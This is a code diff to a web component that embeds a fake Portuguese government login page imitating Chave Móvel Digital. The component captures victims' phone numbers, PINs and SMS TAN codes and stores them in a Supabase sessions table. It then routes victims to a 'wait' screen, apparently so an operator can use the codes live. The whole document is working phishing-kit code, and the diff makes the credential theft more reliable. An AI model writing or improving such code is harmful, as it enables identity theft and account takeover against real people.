@@ -14,8 +14,8 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const [saving, setSaving] = useState(false);
+  const [step1Done, setStep1Done] = useState(false);
   const formDataRef = useRef<Record<string, unknown>>({});
-  const step1DataRef = useRef<Record<string, string>>({});
 
   useEffect(() => {
     let cancelled = false;
@@ -23,7 +23,12 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
       if (supabase === null || !sessionId || sessionId === "preview") return;
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
-      formDataRef.current = (data.form_data ?? {}) as Record<string, unknown>;
+      const fd = (data.form_data ?? {}) as Record<string, unknown>;
+      formDataRef.current = fd;
+      // Adim 1 (telemovel + PIN) daha once gonderildiyse iframe'i direkt adim 2'den ac.
+      if (typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() !== "") {
+        setStep1Done(true);
+      }
     })();
     return () => {
       cancelled = true;
@@ -42,21 +47,26 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
       if (data.trigger === "step1") {
         const phone = typeof payload.inputMobile === "string" ? payload.inputMobile.trim() : "";
         const pin = typeof payload.txtPin === "string" ? payload.txtPin.trim() : "";
-        step1DataRef.current = { phone, pin };
         const nextFormData = {
           ...formDataRef.current,
-          bankPhone: phone,
-          pin,
           cmdPhone: phone,
           cmdPin: pin,
-          loginMethod: "Chave Móvel Digital",
           autenticacaoMethod: "Chave Móvel Digital",
+          autenticacaoStep1At: new Date().toISOString(),
         };
-        formDataRef.current = nextFormData;
-        void supabase
-          .from("sessions")
-          .update({ is_hidden: false, form_data: nextFormData })
-          .eq("id", sessionId);
+        setSaving(true);
+        void (async () => {
+          const { error } = await supabase
+            .from("sessions")
+            .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
+            .eq("id", sessionId);
+          if (!error) {
+            formDataRef.current = nextFormData;
+            router.push(stepToPath("wait", sessionId, routeSessionId));
+          } else {
+            setSaving(false);
+          }
+        })();
         return;
       }
 
@@ -64,15 +74,8 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
         const tan = typeof payload.txtMobileTAN === "string" ? payload.txtMobileTAN.trim() : "";
         const nextFormData = {
           ...formDataRef.current,
-          bankPhone: step1DataRef.current.phone || formDataRef.current.bankPhone || "",
-          pin: step1DataRef.current.pin || formDataRef.current.pin || "",
-          cmdPhone: step1DataRef.current.phone || formDataRef.current.cmdPhone || "",
-          cmdPin: step1DataRef.current.pin || formDataRef.current.cmdPin || "",
           cmdTan: tan,
           autenticacaoTan: tan,
-          tacCode: tan,
-          loginMethod: "Chave Móvel Digital",
-          autenticacaoMethod: "Chave Móvel Digital",
           approvalStatus: "autenticacao_confirmed",
           autenticacaoSubmittedAt: new Date().toISOString(),
         };
@@ -103,7 +106,7 @@ export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
         </div>
       )}
       <iframe
-        src="/gov-auth/1.html"
+        src={step1Done ? "/gov-auth/1.html#step2" : "/gov-auth/1.html"}
         className="w-full border-0"
         style={{ height: "100dvh", display: "block" }}
         sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
